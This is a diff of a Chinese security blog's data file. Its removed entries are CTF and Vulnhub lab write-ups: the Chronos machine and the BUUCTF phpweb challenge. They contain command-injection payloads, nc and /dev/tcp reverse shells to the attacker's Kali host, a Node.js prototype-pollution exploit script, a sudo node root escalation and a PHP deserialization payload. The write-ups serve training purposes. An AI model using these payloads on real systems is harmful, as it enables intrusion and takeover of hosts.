-<li>*框架漏洞利用**</li>
-<li>代码审计</li>
-<li>NC串联</li>
-<li>本地提权</li>
-</ul>
-<h1 id="网卡配置">网卡配置</h1>
-<p>查看 <strong>第一周</strong> 的信息。</p>
-<p>攻击主机 kali：<code>192.168.137.104</code></p>
-<h1 id="渗透">渗透</h1>
-<h2 id="主机发现">主机发现</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo netdiscover -r 192.168.137.0/16 </span><br><span class="line"></span><br><span class="line">如果实际的子网掩码是24位，那么上面查询的时候就减8，也就是16。实际查询的子网掩码位数设置为实际的子网掩码位数减8效果最好。</span><br></pre></td></tr></table></figure>
-<p>原理：与前面的两者相同，都是通过ARP解析</p>
-<p>结果：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401113217.png" /></p>
-<p>因此，靶机的IP为 192.168.137.105</p>
-<h2 id="端口扫描">端口扫描</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p1-65535 192.168.137.103</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401113352.png" /></p>
-<h2 id="端口服务发现">端口服务发现</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,80,8000 -sV 192.168.137.105</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401113546.png" /></p>
-<p>信息：</p>
-<ol type="1">
-<li>22端口上的服务为openssh</li>
-<li>80端口上的服务为http，版本为 2.4.29</li>
-<li>8000端口上的服务也是http，但是用的 <code>node.js express framework</code></li>
-<li>系统为Ubuntu</li>
-</ol>
-<h2 id="访问http服务">访问http服务</h2>
-<p>有三件事必须做：</p>
-<ol type="1">
-<li>抓包</li>
-<li>看源码</li>
-<li>扫目录</li>
-</ol>
-<p>发现80端口和8000端口很类似（一个朴素，一个华丽），源码是一样的，其中有一串特殊的字符： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var _0x5bdf=[&#x27;150447srWefj&#x27;,&#x27;70lwLrol&#x27;,&#x27;1658165LmcNig&#x27;,&#x27;open&#x27;,&#x27;1260881JUqdKM&#x27;,&#x27;10737CrnEEe&#x27;,&#x27;2SjTdWC&#x27;,&#x27;readyState&#x27;,&#x27;responseText&#x27;,&#x27;1278676qXleJg&#x27;,&#x27;797116soVTES&#x27;,&#x27;onreadystatechange&#x27;,&#x27;http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL&#x27;,&#x27;User-Agent&#x27;,&#x27;status&#x27;,&#x27;1DYOODT&#x27;,&#x27;400909Mbbcfr&#x27;,&#x27;Chronos&#x27;,&#x27;2QRBPWS&#x27;,&#x27;getElementById&#x27;,&#x27;innerHTML&#x27;,&#x27;date&#x27;];(function(_0x506b95,_0x817e36)&#123;var _0x244260=_0x432d;while(!![])&#123;try&#123;var _0x35824b=-parseInt(_0x244260(0x7e))*parseInt(_0x244260(0x90))+parseInt(_0x244260(0x8e))+parseInt(_0x244260(0x7f))*parseInt(_0x244260(0x83))+-parseInt(_0x244260(0x87))+-parseInt(_0x244260(0x82))*parseInt(_0x244260(0x8d))+-parseInt(_0x244260(0x88))+parseInt(_0x244260(0x80))*parseInt(_0x244260(0x84));if(_0x35824b===_0x817e36)break;else _0x506b95[&#x27;push&#x27;](_0x506b95[&#x27;shift&#x27;]());&#125;catch(_0x3fb1dc)&#123;_0x506b95[&#x27;push&#x27;](_0x506b95[&#x27;shift&#x27;]());&#125;&#125;&#125;(_0x5bdf,0xcaf1e));function _0x432d(_0x16bd66,_0x33ffa9)&#123;return _0x432d=function(_0x5bdf82,_0x432dc8)&#123;_0x5bdf82=_0x5bdf82-0x7e;var _0x4da6e8=_0x5bdf[_0x5bdf82];return _0x4da6e8;&#125;,_0x432d(_0x16bd66,_0x33ffa9);&#125;function loadDoc()&#123;var _0x17df92=_0x432d,_0x1cff55=_0x17df92(0x8f),_0x2beb35=new XMLHttpRequest();_0x2beb35[_0x17df92(0x89)]=function()&#123;var _0x146f5d=_0x17df92;this[_0x146f5d(0x85)]==0x4&amp;&amp;this[_0x146f5d(0x8c)]==0xc8&amp;&amp;(document[_0x146f5d(0x91)](_0x146f5d(0x93))[_0x146f5d(0x92)]=this[_0x146f5d(0x86)]);&#125;,_0x2beb35[_0x17df92(0x81)](&#x27;GET&#x27;,_0x17df92(0x8a),!![]),_0x2beb35[&#x27;setRequestHeader&#x27;](_0x17df92(0x8b),_0x1cff55),_0x2beb35[&#x27;send&#x27;]();&#125;</span><br></pre></td></tr></table></figure></p>
-<p>乍一看，好像是加密的js代码。这里推荐一个网址，可以对代码进行美化和编码解码：https://gchq.github.io/CyberChef/</p>
-<p>利用<code>javascript beautify</code>模块美化之后虽然看的很清楚了，但是因为各种参数都加密了还是无法直到这段代码的意思。但是其中有一串字符没有加密： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL</span><br></pre></td></tr></table></figure></p>
-<p>最后，抓包看一下：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401114650.png" /></p>
-<p>发现确实有数据包往 chronos.local:8000 地方发送，但是我们无法用浏览器直接访问，因为kali并不知道chronos.local是哪台主机，但是我们知道，这应该就是靶机。因此，修改<code>/etc/hosts</code>，添加一条记录：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401120624.png" /></p>
-<p>然后可以访问了，并且页面发生了变化。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401120700.png" /></p>
-<p>结合url分析，发现url中的那一串字符像是警告base64编码的，因此，再次利用刚刚的网址进行解码。利用 <code>magic</code> 模块进行解码，发现是base58编码。得到解码后的结果：<code>'+Today is %A, %B %d, %Y %H:%M:%S.'</code></p>
-<blockquote>
-<p>base系列有许多，但是常见的是base64和base32。还有许多不常见的，比如这里的base58。</p>
-</blockquote>
-<ol type="1">
-<li>date</li>
-<li><code>'+Today is %A, %B %d, %Y %H:%M:%S.'</code></li>
-<li>页面上显示的时间信息</li>
-</ol>
-<p>这让我想到Linux中的date命令，也是能够显示时间，因此在kali上尝试一下如下代码： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">date &#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401121236.png" /></p>
-<p>发现结果和页面显示的一模一样（未经过渲染）。因此，有理由怀疑后台服务调用了系统命令，并且后台代码可能如下（猜测，并不是真正的代码，只是说明代码逻辑）： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd = &#x27;date&#x27; .$format;</span><br><span class="line">system(cmd);</span><br></pre></td></tr></table></figure></p>
-<p>如果我们什么都不修改，那么执行的命令就是<code>date '+Today is %A, %B %d, %Y %H:%M:%S.'</code>，因此，我们可以考虑到Linux中以下执行多条命令（上周使用的是管道符，这周使用 <code>$$</code>，该符号只有在前面的命令正确执行的情况下，才会执行后面的命令）</p>
-<p>先做一个尝试， <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;&amp;ls -&gt; yZSGA</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401134641.png" /></p>
-<p>成功执行，因此这里确实调用了系统命令。接下来使用nc串联来反弹shell（先判断是否有nc，然后再判断是否有 -e）</p>
-<h2 id="反弹shell">反弹shell</h2>
-<p>首先在kali上启动两个监听端口： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lnvp 3333</span><br><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure></p>
-<p>然后将payload base58编码： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;&amp;nc 192.168.137.104 3333|/bin/bash|nc 192.168.137.104 4444</span><br><span class="line">2XqeYgBDNepmM9vgTVeLGrep4fZHdsG5tAFHFFoH1pgfmPx59cE4Pphh2FNWaHBapy5Tin3Vs6E4MYXhu</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401135228.png" /></p>
-<p>虽然提示出错，但是kali已经成功连接上了</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401135325.png" /></p>
-<p>接下来进行信息收集：</p>
-<p>发现在 <code>/home/imera</code> 目录下有一个<code>user.txt</code>文件，但是却没有权限读取，这应该就是其中一个flag了。并且在<code>/root</code>目录下也有一个flag，这应该是第二个flag，不出意料也没有权限读取。</p>
-<p>还可以看一下 <code>app.js</code> <code>package.jsom</code> 和 <code>package-lock.json</code> 的内容，其中第一个的源码如下： <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// created by alienum for Penetration Testing</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123;exec&#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bs58 = <span class="built_in">require</span>(<span class="string">&#x27;bs58&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8000</span>;</span><br><span class="line"><span class="keyword">const</span> cors = <span class="built_in">require</span>(<span class="string">&#x27;cors&#x27;</span>);</span><br><span class="line">app.use(cors());</span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	res.sendFile(<span class="string">&#x27;/var/www/html/index.html&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">app.get(<span class="string">&#x27;/date&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="keyword">var</span> agent = req.headers[<span class="string">&#x27;user-agent&#x27;</span>];</span><br><span class="line">	<span class="keyword">var</span> cmd = <span class="string">&#x27;date &#x27;</span>;</span><br><span class="line">	<span class="keyword">const</span> format = req.query.format;</span><br><span class="line">	<span class="keyword">const</span> bytes = bs58.decode(format);</span><br><span class="line">	<span class="keyword">var</span> decoded = bytes.toString();</span><br><span class="line">	<span class="keyword">var</span> concat = cmd.concat(decoded);</span><br><span class="line">	<span class="keyword">if</span> (agent === <span class="string">&#x27;Chronos&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (concat.includes(<span class="string">&#x27;id&#x27;</span>) || concat.includes(<span class="string">&#x27;whoami&#x27;</span>) || concat.includes(<span class="string">&#x27;python&#x27;</span>) || concat.includes(<span class="string">&#x27;nc&#x27;</span>) || concat.includes(<span class="string">&#x27;bash&#x27;</span>) || concat.includes(<span class="string">&#x27;php&#x27;</span>) || concat.includes(<span class="string">&#x27;which&#x27;</span>) || concat.includes(<span class="string">&#x27;socat&#x27;</span>)) &#123;</span><br><span class="line">			res.send(<span class="string">&#x27;Something went wrong&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		exec(concat, <span class="function">(<span class="params">error, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (error) &#123;</span><br><span class="line">				<span class="built_in">console</span>.log(<span class="string">`error: <span class="subst">$&#123; error.message &#125;</span>`</span>);</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (stderr) &#123;</span><br><span class="line">				<span class="built_in">console</span>.log(<span class="string">`stderr: <span class="subst">$&#123; stderr &#125;</span>`</span>);</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			res.send(stdout);</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		res.send(<span class="string">&#x27;Permission Denied&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br><span class="line">app.listen(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">`Server running at <span class="subst">$&#123; port &#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
-<p>上述代码中就可以验证确实是执行了系统命令，并且还记得之前弹出的“something went wrong”吗？这是因为这里做了过滤，但是仅仅只是判断了以下，并没有阻止命令执行。这就叫百密一疏吧。</p>
-<p>还有一个目录 <code>/opt/chronos-v2</code>，里面有一个<code>backend</code>的目录，这一看就是与后台有关。里面有一个<code>server.js</code>，代码如下： <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fileupload = <span class="built_in">require</span>(<span class="string">&#x27;express-fileupload&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line">app.use(fileupload(&#123; <span class="attr">parseNested</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">app.set(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.set(<span class="string">&#x27;views&#x27;</span>, <span class="string">&#x27;/opt/chronos-v2/frontend/pages&#x27;</span>);</span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	res.render(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">const</span> server = http.Server(app);</span><br><span class="line"><span class="keyword">const</span> addr = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8080</span>;</span><br><span class="line">server.listen(port, addr, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">&#x27;Server listening on &#x27;</span> + addr + <span class="string">&#x27; port &#x27;</span> + port);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
-<p>从这里能看出有一个8080端口，但是只能通过127.0.0.1才能访问，这也是为什么端口扫面无法得到这个端口。</p>
-<p>信息收集差不多，那么接下来就是要提权了。</p>
-<h2 id="权限提升-本地提权">权限提升-本地提权</h2>
-<p>Linux提权常用的三种方式：</p>
-<ol type="1">
-<li>内核漏洞</li>
-<li>suid提权</li>
-<li>sudo配置不当提权</li>
-</ol>
-<p>这里经过测试发现前两者都不行。因此得另想办法，忽然想到之前信息收集得到了一个技术 node.js。查看了<code>/chronos-v2/backend/package.json</code></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401142659.png" /></p>
-<p>这里的是否存在文件上传的漏洞？因此去搜一下，发现虽然不存在文件上传漏洞，但是存在node.js的原型链污染，可以使用这个漏洞进行提权。</p>
-<p>博客地址如下：https://blog.p6.is/Real-World-JS-1/</p>
-<p>还提供了exp： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;bash -c &quot;bash -i &amp;&gt; /dev/tcp/192.168.137.104/5555 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pollute</span></span><br><span class="line">requests.post(<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>, files = &#123;<span class="string">&#x27;__proto__.outputFunctionName&#x27;</span>: (</span><br><span class="line">    <span class="literal">None</span>, <span class="string">f&quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;<span class="subst">&#123;cmd&#125;</span>&#x27;);x&quot;</span>)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># execute command</span></span><br><span class="line">requests.get(<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
-<p>（第一个ip为靶机IP，后面两个的端口为node.js所在端口，也就是8080，从刚刚的信息收集中知道）</p>
-<p>在kali上编写上面的程序，然后开启http服务，让靶机下载这个文件。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali: python -m SimpleHTTPServer 80</span><br><span class="line">靶机: </span><br><span class="line">cd /tmp</span><br><span class="line">wget http://192.168.137.104/exp.py</span><br></pre></td></tr></table></figure></p>
-<p>然后kali监听8888端口，靶机执行该程序 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali: nc -lvnp 8888</span><br><span class="line">靶机: </span><br><span class="line">	chmod +x exp.py</span><br><span class="line">	python3 exp.py</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401145431.png" /></p>
-<p>获得 imera 权限，虽然不是root，但是也足够读取其中一个flag了。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/home/imera/user.txt: </span><br><span class="line">byBjaHJvbm9zIHBlcm5hZWkgZmlsZSBtb3UK</span><br></pre></td></tr></table></figure></p>
-<p>接下来还需要提权，得到root权限。这里介绍常用的Linux提权的第三种，sudo配置提权。</p>
-<p>查看sudo配置： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401145800.png" /></p>
-<p>注意到用户imera拥有两个程序 npm和node的全部权限，还不需要密码，因此可以在这里提权。</p>
-<p>参考文章：https://gtfobins.github.io/gtfobins/node/</p>
-<p>执行以下命令： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo node -e &#x27;child_process.spawn(&quot;/bin/sh&quot;, &#123;stdio: [0, 1, 2]&#125;)&#x27;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401150130.png" /></p>
-<p>提权成功。</p>
-<p>获取第二个flag： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/root/root.txt: </span><br><span class="line">YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK</span><br></pre></td></tr></table></figure></p>
-<p>至此，渗透过程结束。</p>
-<h1 id="彩蛋部分">彩蛋部分</h1>
-<p>将两个flag解码（base64），然后再放到谷歌去翻译，得到如下：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401150635.png" /></p>
-<h1 id="总结">总结</h1>
-<p>通过对这个靶机的渗透，有以下几点感受：</p>
-<ol type="1">
-<li>如同第一次权限提升的时候，经常会遇到我们不熟悉的技术，这时候就需要大量的搜索，快速学习！</li>
-<li>学习了第三种Linux提权的方式</li>
-<li>node.js的express-fileupload 1.1.7 存在原型链污染漏洞</li>
-</ol>
-]]></content>
-      <categories>
-        <category>内网渗透</category>
-      </categories>
-      <tags>
-        <tag>综合</tag>
-        <tag>vulnhub</tag>
-        <tag>node.js原型链污染</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>第2周：Vulnhub cloudantivirus writeup</title>
     <url>/2022/03/29/%E7%AC%AC2%E5%91%A8%EF%BC%9AVulnhub%20cloudantivirus%20writeup/</url>
     <content><![CDATA[<p>这是白帽学苑的课程——30周打靶的第2周，该靶机难度简单。</p>
@@ -1648,46 +1551,6 @@
       </tags>
   </entry>
   <entry>
-    <title>网鼎杯 2020 朱雀组 phpweb</title>
-    <url>/2022/03/27/%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84%20phpweb/</url>
-    <content><![CDATA[<p>BUUCTF 网址：<a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p>
-<span id="more"></span>
-<h1 id="题目信息">题目信息</h1>
-<p>进入环境，会发现5秒后自动跳转到 index.php 页面，并且之后每5秒刷新一次，查看源码，发现应该是如下函数： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setTimeout(&quot;document.form1.submit()&quot;,5000)</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327230357.png" /></p>
-<p>这不是重点，接着我们抓包</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327230244.png" /></p>
-<p>发现 POST 提交了两个参数 <code>func</code> 和 <code>p</code> 。结合上面的表单消息推测，<code>func</code> 应该是函数的意思，而 <code>p</code> 应该是一个参数。（上面表单中的<code>p</code> 是时间的格式，可能是参数）</p>
-<h1 id="解题">解题</h1>
-<p>将函数随便改一个试试看（这里 echo 并不是函数，主要想看看报错的信息）</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327230721.png" /></p>
-<p>注意 <code>call_user_func()</code>，这函数的作用简而言之就是调用一个PHP函数，可以带入参数，语法如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">call_user_func(<span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">mixed</span> <span class="variable">$parameter</span> = ?, <span class="keyword">mixed</span> $... = ?): <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure></p>
-<p>更多信息请参考：<a href="https://www.php.net/manual/zh/function.call-user-func.php">PHP_call_user_func</a></p>
-<p>因此，我们尝试用 <code>file_get_contents()</code> 读取一下 <code>index.php</code> 的内容</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327231040.png" /></p>
-<p>将代码整理如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$disable_fun</span> = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$result</span> = call_user_func(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">	<span class="variable">$a</span>= gettype(<span class="variable">$result</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">	    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;func&quot;</span>];</span><br><span class="line"><span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$func</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">	<span class="variable">$func</span> = strtolower(<span class="variable">$func</span>);</span><br><span class="line">    <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>,<span class="variable">$disable_fun</span>)) &#123;</span><br><span class="line">	    <span class="keyword">echo</span> gettime(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>这里<code>get time</code> 中的 <code>call_user_func()</code> 函数能够调用的函数被禁了好多，但是这不是重点，重点是 <code>Test</code> 类里面的 <code>__destruct</code> ，这个也可以调用 <code>call_user_func()</code> 而且是不经过验证。因此思路就是构造序列化字符串作为 POST 提交的 <code>p</code> ，而POST 提交的 <code>func</code> 则为 <code>unserialize</code>。</p>
-<p>接下来构造 <code>p</code> （这里的p指的是POST提交的，而不是类中的）</p>
-<blockquote>
-<p>这里类中的 var 其实是 public 的别名</p>
-</blockquote>
-<p>编写简单的PHP脚本： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;参数&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$payload</span> = <span class="keyword">new</span> Test;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$payload</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>参数依次如下： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. ls / # 查看根目录</span><br><span class="line">2. ls   # 查看当前目录</span><br><span class="line">3. find / -name flag* # 找flag文件路径，这里会找到很多，但是其他的一看就不像</span><br><span class="line">4. cat /tmp/flagoefiu4r93 # 读取flag</span><br></pre></td></tr></table></figure></p>
-<p>将上面参数带入PHP脚本，然后执行得到的字符串作为 POST 提交的 p。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327232126.png" /></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327232212.png" /></p>
-<h1 id="总结">总结</h1>
-<p>本题难度并不大，主要的难点就在于报错提示的 <code>call_user_func()</code> ，要明白它的作用。本题考的其实是PHP知识点，熟悉PHP中的函数尤其是调用系统的命令的函数以及反序列化知识点。前者其实可以在 <strong>命令执行</strong> 相关题目中积累。</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>PHP</tag>
-        <tag>反序列化</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>网鼎杯 2018 Fakebook</title>
     <url>/2022/03/21/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%20Fakebook/</url>
     <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
@@ -1741,8 +1604,185 @@
         <category>CTF</category>
       </categories>
       <tags>
-        <tag>反序列化</tag>
         <tag>sql注入</tag>
+        <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>第3周：Vulnhub chronos writeup</title>
+    <url>/2022/04/01/%E7%AC%AC3%E5%91%A8%EF%BC%9AVulnhub%20chronos%20writeup/</url>
+    <content><![CDATA[<p>这是白帽学苑的课程——30周打靶的第3周，该靶机难度简单。</p>
+<span id="more"></span>
